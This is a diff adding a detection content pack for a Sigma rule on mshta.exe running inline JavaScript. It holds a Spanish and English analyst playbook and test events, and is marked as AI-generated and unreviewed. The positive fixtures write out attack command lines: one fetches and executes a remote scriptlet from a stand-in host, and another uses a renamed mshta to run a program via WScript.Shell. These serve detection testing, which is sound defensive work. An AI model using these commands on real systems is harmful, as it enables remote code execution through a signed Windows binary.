@@ -1,0 +1,134 @@
+{
+  "rule": {
+    "id": "67f113fa-e23d-4271-befa-30113b3e08b1",
+    "title": "Suspicious JavaScript Execution Via Mshta.EXE",
+    "level": "high",
+    "status": "test",
+    "author": "E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community",
+    "path": "windows/process_creation/proc_creation_win_mshta_javascript.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_mshta_javascript.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1218.005"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó mshta.exe (o un binario renombrado con OriginalFileName MSHTA.EXE) con la cadena 'javascript' en la línea de comandos. Normalmente indica que se está ejecutando código JavaScript inline mediante un binario firmado de Windows.",
+      "what_it_detects": "Eventos de creación de procesos en Windows donde Image termina en \\mshta.exe u OriginalFileName es MSHTA.EXE, y CommandLine contiene 'javascript', por ejemplo un protocolo 'javascript:' que ejecuta script sin archivo .hta.",
+      "why_it_matters": "Mshta es un binario legítimo de Microsoft que ejecuta HTA y script. Los atacantes lo usan como proxy de ejecución firmado (ATT&CK T1218.005) para evadir controles, descargar scriptlets remotos y lanzar payloads sin dejar muchos archivos en disco.",
+      "triage_steps": [
+        "Revise el CommandLine completo: identifique URLs, llamadas GetObject('script:...'), ActiveXObject, WScript.Shell, Run/Exec o código ofuscado.",
+        "Compare Image con OriginalFileName; si mshta está renombrado o fuera de System32/SysWOW64, trate la alerta como más grave.",
+        "Analice ParentImage y su línea de comandos: Office, navegadores, explorer.exe vía acceso directo LNK, wmiprvse.exe o la clave Run sugieren distintos vectores.",
+        "Liste los procesos hijos de mshta (powershell.exe, cmd.exe, rundll32.exe, regsvr32.exe) en el mismo host dentro de +/- 15 minutos.",
+        "Busque conexiones de red y consultas DNS de mshta.exe en esa ventana; verifique la reputación de los dominios e IP de destino.",
+        "Revise creación de archivos, tareas programadas y claves Run/RunOnce asociadas al usuario y host para detectar persistencia.",
+        "Busque alertas previas del mismo usuario, host o dominio, y la misma línea de comandos en otros endpoints."
+      ],
+      "false_positives": [
+        "La regla no documenta falsos positivos conocidos; el uso legítimo de 'javascript:' con mshta es poco común.",
+        "Herramientas internas antiguas o instaladores que lanzan mshta con JavaScript inline para mostrar diálogos; valide con el equipo responsable.",
+        "Ejercicios de red team o pruebas con Atomic Red Team (T1218.005) autorizados."
+      ],
+      "response_steps": [
+        "Confirme la actividad con el usuario y el dueño del sistema; descarte pruebas autorizadas antes de escalar.",
+        "Si es malicioso, aísle el endpoint desde el EDR y finalice mshta.exe y sus procesos hijos.",
+        "Bloquee los dominios, URLs e IP observados en el proxy, DNS y firewall; busque el mismo indicador en toda la flota.",
+        "Elimine la persistencia y artefactos encontrados tras preservar evidencia (memoria, archivos, hashes).",
+        "Restablezca las credenciales del usuario si hubo ejecución de payload y considere bloquear mshta.exe con WDAC o AppLocker donde no se necesite."
+      ],
+      "severity_rationale": "El nivel alto es adecuado porque ejecutar JavaScript inline mediante mshta casi nunca es legítimo y es una técnica habitual de ejecución inicial y evasión."
+    },
+    "en": {
+      "summary": "mshta.exe (or a renamed binary whose OriginalFileName is MSHTA.EXE) ran with the string 'javascript' in its command line. This usually means inline JavaScript was executed through a signed Windows binary.",
+      "what_it_detects": "Windows process creation events where Image ends with \\mshta.exe or OriginalFileName is MSHTA.EXE, and CommandLine contains 'javascript', such as a 'javascript:' protocol running script without an .hta file.",
+      "why_it_matters": "Mshta is a legitimate Microsoft binary that runs HTA files and script. Attackers abuse it as a signed proxy for execution (ATT&CK T1218.005) to bypass controls, fetch remote scriptlets and launch payloads with little on disk.",
+      "triage_steps": [
+        "Read the full CommandLine: look for URLs, GetObject('script:...'), ActiveXObject, WScript.Shell, Run/Exec calls or obfuscated code.",
+        "Compare Image with OriginalFileName; a renamed mshta or one outside System32/SysWOW64 raises severity.",
+        "Check ParentImage and its command line: Office, browsers, explorer.exe via LNK, wmiprvse.exe or Run keys point to different delivery vectors.",
+        "List child processes of mshta (powershell.exe, cmd.exe, rundll32.exe, regsvr32.exe) on the same host within +/- 15 minutes.",
+        "Review network connections and DNS queries by mshta.exe in that window; check reputation of destination domains and IPs.",
+        "Look for file writes, scheduled tasks and Run/RunOnce keys tied to the user and host to spot persistence.",
+        "Search earlier alerts for the same user, host or domain, and the same command line on other endpoints."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives; legitimate 'javascript:' use with mshta is rare.",
+        "Legacy internal tools or installers that launch mshta with inline JavaScript to show dialogs; confirm with the owning team.",
+        "Authorized red team exercises or Atomic Red Team T1218.005 tests."
+      ],
+      "response_steps": [
+        "Confirm the activity with the user and system owner; rule out authorized testing before escalating.",
+        "If malicious, isolate the endpoint via EDR and terminate mshta.exe and its child processes.",
+        "Block observed domains, URLs and IPs at proxy, DNS and firewall; hunt for the same indicator fleet-wide.",
+        "Remove persistence and artifacts after preserving evidence (memory, files, hashes).",
+        "Reset the user's credentials if a payload ran, and consider blocking mshta.exe with WDAC or AppLocker where not needed."
+      ],
+      "severity_rationale": "High fits because running inline JavaScript through mshta is almost never legitimate and is a common initial execution and defense-evasion technique."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "mshta.exe launched from an LNK by explorer.exe running inline JavaScript that loads a remote scriptlet",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\mshta.exe",
+          "OriginalFileName": "MSHTA.EXE",
+          "CommandLine": "\"C:\\Windows\\System32\\mshta.exe\" javascript:a=(GetObject('script:https://cdn.example.com/u.sct')).Exec();close();",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "ParentCommandLine": "C:\\Windows\\Explorer.EXE"
+        }
+      },
+      {
+        "description": "Renamed mshta copied to a public folder, identified by OriginalFileName, executing JavaScript",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mlopez",
+          "Image": "C:\\Users\\Public\\winupdate.exe",
+          "OriginalFileName": "MSHTA.EXE",
+          "CommandLine": "C:\\Users\\Public\\winupdate.exe \"JavaScript:new ActiveXObject('WScript.Shell').Run('calc.exe');close();\"",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c C:\\Users\\Public\\winupdate.exe"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "mshta.exe opening a vendor HTA file from Program Files, no 'javascript' in the command line",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\mshta.exe",
+          "OriginalFileName": "MSHTA.EXE",
+          "CommandLine": "\"C:\\Windows\\System32\\mshta.exe\" \"C:\\Program Files\\Contoso Tools\\setup.hta\"",
+          "ParentImage": "C:\\Program Files\\Contoso Tools\\launcher.exe"
+        }
+      },
+      {
+        "description": "wscript.exe running a JavaScript file; command line mentions javascript but the binary is not mshta",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0310.andes.example.com",
+          "User": "ANDES\\agarcia",
+          "Image": "C:\\Windows\\System32\\wscript.exe",
+          "OriginalFileName": "wscript.exe",
+          "CommandLine": "wscript.exe //E:javascript C:\\Scripts\\inventory.js",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
